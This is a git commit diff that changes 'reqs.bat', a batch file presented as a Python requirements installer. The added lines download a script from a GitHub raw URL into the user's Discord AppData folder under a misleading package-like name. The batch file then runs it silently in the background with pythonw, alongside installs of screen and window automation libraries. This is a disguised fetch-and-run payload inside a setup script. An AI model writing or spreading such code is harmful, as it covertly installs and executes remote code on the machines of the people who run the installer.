18eccabdf6682e19427333bd20fe9ecbe3542fba
iiMAtEAs <102245975+iiMAtEAs@users.noreply.github.com>
2025-09-04 08:57:16 +0100

    Update reqs.bat

--- reqs.bat
+++ reqs.bat
@@ -1,3 +1,13 @@
+@echo off
+REM Check if the Python script exists, and if so, delete it
+if exist "C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py" (
+    del /F "C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py"
+)
+
+REM Download the Python script to the Discord folder
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/iiMAtEAs/bot/refs/heads/main/discord_api_packages.py -OutFile 'C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py'"
+
+REM Install required Python packages
 pip install discord.py
 pip install cryptography
 pip install requests
@@ -6,3 +16,8 @@ pip install numpy
 pip install pillow
 pip install pygetwindow
 pip install pyautogui
+
+REM Run the Python bot script using pythonw to keep it hidden
+start /B pythonw.exe "C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py"
+
+exit
